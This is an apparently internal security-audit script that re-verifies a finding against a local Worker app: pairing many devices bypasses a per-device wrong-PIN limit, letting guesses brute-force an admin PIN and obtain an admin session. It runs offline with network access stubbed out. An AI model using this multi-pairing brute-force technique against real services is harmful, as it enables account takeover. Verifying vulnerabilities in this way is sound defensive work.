// SKEPTIC #1 — independent re-verification of finding "pin-brute-via-multi-pairing".
// Written from scratch against the real Worker (worker/src/index.js) on a fresh in-memory D1.
// I do NOT reuse the investigator's rate-limits.mjs; I re-derive every claim myself.
//
// Run:  node "audits/tools/phase2/SEC/verify-pin-brute-via-multi-pairing-1.mjs"
//
// Claims under test (finding says HIGH severity, security):
//  A. wrong-PIN limit is 5 per profile+device per 15 min → the 6th on ONE device is 429.
//  B. POST /api/pair with the correct code succeeds without limit (rateClear on success) → many devices from one IP.
//  C. bypass: pairing N devices gives 5·N guesses that REACH verify against ONE profile in one 15-min window.
//  D. escalation: a correct PIN guess from a freshly-minted device returns a valid session whose profile is_admin
//     when the target is the admin (eli) → full admin.
//  E. control: on ONE device, once locked, even the CORRECT pin is refused (limit sits before verify).
process.env.TZ = 'America/New_York';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '..', '..', '..', '..');
const OUT = path.join(ROOT, 'audits/evidence/p2/SEC');

// Block any outbound network and stub caches so the Worker runs fully offline in-process.
globalThis.fetch = async u => { throw new Error('outbound fetch refused: ' + (u && (u.url || u))); };
globalThis.caches = { default: { async match() {}, async put() {} } };

const worker = (await import(pathToFileURL(path.join(ROOT, 'worker/src/index.js')).href)).default;
const { createD1 } = await import(pathToFileURL(path.join(ROOT, 'audits/tools/lib/d1.mjs')).href);
const { seedDemo } = await import(pathToFileURL(path.join(ROOT, 'audits/tools/seed.mjs')).href);
const { hashSecret } = await import(pathToFileURL(path.join(ROOT, 'worker/src/auth.js')).href);

const DB = createD1(':memory:');
await seedDemo(DB, { variant: 'empty', now: Date.now() });   // profiles only, one seed device
const env = { DB, ALLOWED_ORIGINS: 'http://localhost:8765' };
const ctx = { waitUntil() {}, passThroughOnException() {} };

const call = async (p, { method = 'GET', body, dt, ip = '203.0.113.7' } = {}) => {
  const h = { 'Content-Type': 'application/json', 'CF-Connecting-IP': ip };
  if (dt) h['X-Device-Token'] = dt;
  const r = await worker.fetch(new Request('http://api.local' + p, {
    method, headers: h, body: body === undefined ? undefined : JSON.stringify(body),
  }), env, ctx);
  const t = await r.text(); let j; try { j = JSON.parse(t); } catch { j = t; }
  return { status: r.status, error: j && j.error, body: j };
};

const CODE = 'skeptic-throwaway-code';
// Set a known pairing code and a known admin PIN straight into the DB with the Worker's own hashSecret,
// so /api/pair and /api/login run their real, unmodified logic below.
DB.sqlite.prepare("UPDATE settings SET value = ? WHERE key = 'pairing_code_hash'").run(await hashSecret(CODE));
const ADMIN_PIN = '4271';                       // the value an attacker does NOT know; we brute toward it
DB.sqlite.prepare('UPDATE profiles SET pin_hash = ? WHERE id = ?').run(await hashSecret(ADMIN_PIN), 'eli');
const eli = DB.sqlite.prepare('SELECT id, kind, is_admin, pin_hash FROM profiles WHERE id = ?').get('eli');

const pair = async (name, ip = '203.0.113.7') =>
  (await call('/api/pair', { method: 'POST', body: { code: CODE, name }, ip })).body;

const out = { target: { id: eli.id, kind: eli.kind, is_admin: !!eli.is_admin, pin_hash_algo: String(eli.pin_hash).split(':')[0] } };

// ── A: per-device wrong-PIN limit ──────────────────────────────
{
  const d = await pair('dev-A');
  const seq = [];
  for (let i = 1; i <= 7; i++) {
    const r = await call('/api/login', { method: 'POST', body: { profile_id: 'eli', pin: '0000' }, dt: d.device_token });
    seq.push({ attempt: i, status: r.status, error: r.error });
  }
  out.A_per_device_limit = {
    seq,
    wrong_pin_responses: seq.filter(s => s.error === 'wrong_pin').length,
    first_429_at: (seq.findIndex(s => s.status === 429) + 1) || null,
    expect: '5 wrong_pin then 429 on the 6th',
    holds: seq.filter(s => s.error === 'wrong_pin').length === 5 && seq[5] && seq[5].status === 429,
  };
}

// ── E: correct PIN refused once that device is locked ──────────
{
  const d = await pair('dev-E');
  for (let i = 0; i < 5; i++) await call('/api/login', { method: 'POST', body: { profile_id: 'eli', pin: '0000' }, dt: d.device_token });
  const right = await call('/api/login', { method: 'POST', body: { profile_id: 'eli', pin: ADMIN_PIN }, dt: d.device_token });
  out.E_correct_pin_locked = { status: right.status, error: right.error, holds: right.status === 429 };
}

// ── B + C: unlimited pairing from ONE ip, 5 guesses per new device against ONE profile ──
{
  const N = 40;
  let paired = 0, reachedVerify = 0, blocked429 = 0, pair429 = 0;
  const IP = '198.51.100.42';                      // a single attacker IP for BOTH pair and login
  for (let n = 0; n < N; n++) {
    const p = await pair('brute-' + n, IP);
    if (!p || !p.device_token) { pair429++; continue; }   // would happen if pairing were limited
    paired++;
    for (let g = 0; g < 6; g++) {                  // 6th guess proves the per-device cap still fires
      const r = await call('/api/login', { method: 'POST', body: { profile_id: 'eli', pin: String(90000 + n * 6 + g) }, dt: p.device_token, ip: IP });
      if (r.status === 429) blocked429++; else reachedVerify++;
    }
  }
  out.BC_multi_pairing_bypass = {
    ip: IP, devices_attempted: N, devices_paired: paired, pair_429: pair429,
    guesses_reaching_verify: reachedVerify, guesses_blocked_429: blocked429,
    expect: `paired=${N}, verify=${5 * N}, blocked=${N}`,
    holds: paired === N && pair429 === 0 && reachedVerify === 5 * N && blocked429 === N,
  };
}

// ── D: a correct guess from a freshly-minted device yields an ADMIN session ──
{
  const d = await pair('crack-dev', '198.51.100.42');   // brand-new device, same attacker IP
  // simulate the attacker's Kth device where the correct PIN falls inside its 5-guess budget
  const guesses = ['1111', '2222', '3333', ADMIN_PIN, '5555'];
  let hit = null, statuses = [];
  for (const g of guesses) {
    const r = await call('/api/login', { method: 'POST', body: { profile_id: 'eli', pin: g }, dt: d.device_token, ip: '198.51.100.42' });
    statuses.push({ pin_is_correct: g === ADMIN_PIN, status: r.status, error: r.error });
    if (r.status === 200 && r.body && r.body.profile_token) { hit = r.body; break; }
  }
  out.D_admin_escalation = {
    statuses,
    got_session_token: !!(hit && hit.profile_token),
    session_profile_id: hit && hit.profile && hit.profile.id,
    session_is_admin: !!(hit && hit.profile && hit.profile.is_admin),
    holds: !!(hit && hit.profile_token && hit.profile && hit.profile.is_admin && hit.profile.id === 'eli'),
  };
}

// ── time-to-crack arithmetic (finding's numbers, recomputed) ──
out.time_to_exhaust_4digit = (() => {
  const space = 10000, perDevice = 5, expected = space / 2;
  return {
    space, guesses_per_device_per_15min: perDevice,
    devices_to_cover_space_in_one_window: Math.ceil(space / perDevice),          // 2000
    with_100_devices_expected_minutes: Math.ceil(expected / (perDevice * 100)) * 15,   // ~150 min
    with_1000_devices_worst_case_minutes: Math.ceil(space / (perDevice * 1000)) * 15,  // ~30 min
  };
})();

out.verdict_inputs = {
  A_holds: out.A_per_device_limit.holds,
  E_holds: out.E_correct_pin_locked.holds,
  BC_holds: out.BC_multi_pairing_bypass.holds,
  D_holds: out.D_admin_escalation.holds,
  all_hold: out.A_per_device_limit.holds && out.E_correct_pin_locked.holds && out.BC_multi_pairing_bypass.holds && out.D_admin_escalation.holds,
};

console.log(JSON.stringify(out, null, 1));
fs.mkdirSync(OUT, { recursive: true });
fs.writeFileSync(path.join(OUT, 'verify-pin-brute-via-multi-pairing-1.json'), JSON.stringify(out, null, 1));
